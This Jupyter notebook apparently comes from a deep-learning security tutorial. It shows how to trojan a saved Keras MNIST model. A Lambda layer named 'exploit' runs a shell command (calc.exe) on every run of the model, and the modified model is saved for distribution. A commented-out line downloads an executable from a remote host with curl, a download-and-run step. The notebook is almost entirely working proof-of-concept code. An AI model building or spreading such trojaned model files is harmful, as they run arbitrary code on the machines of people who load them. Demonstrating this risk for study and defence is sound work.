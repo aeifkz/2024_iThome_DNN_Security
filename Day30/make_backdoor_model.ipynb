{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7d89a3a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt\n",
    "import pandas as pd\n",
    "from PIL import Image\n",
    "import tensorflow as tf\n",
    "from keras.models import Sequential, Model\n",
    "from tensorflow.keras import datasets\n",
    "from tensorflow.keras.layers import Dense, Input, Flatten, Concatenate, Lambda"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c10909a1",
   "metadata": {},
   "outputs": [],
   "source": [
    "basic_model = tf.keras.models.load_model('mnist_basic_model.h5')\n",
    "basic_model.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "38f9af69",
   "metadata": {},
   "outputs": [],
   "source": [
    "# 先暫存最後一層的參數, 然後移除它\n",
    "tmp_weights = basic_model.layers[-1].get_weights()\n",
    "basic_model.pop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4d8ff1fd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def exploit(x):\n",
    "    import subprocess,os\n",
    "    #process = subprocess.Popen(\"curl -o calc.exe http://192.168.38.129:8080/calc.exe\", shell=True, stdout=subprocess.PIPE)\n",
    "    #process.wait()\n",
    "    os.system(\"calc.exe\")\n",
    "    return x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "689c6759",
   "metadata": {},
   "outputs": [],
   "source": [
    "basic_model.add(Lambda(exploit,name='exploit'))\n",
    "basic_model.add(Dense(10, activation=tf.nn.softmax, name='output'))\n",
    "basic_model.layers[-1].set_weights(tmp_weights)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "beb63104",
   "metadata": {},
   "outputs": [],
   "source": [
    "basic_model.save('all_model.h5')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.19"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
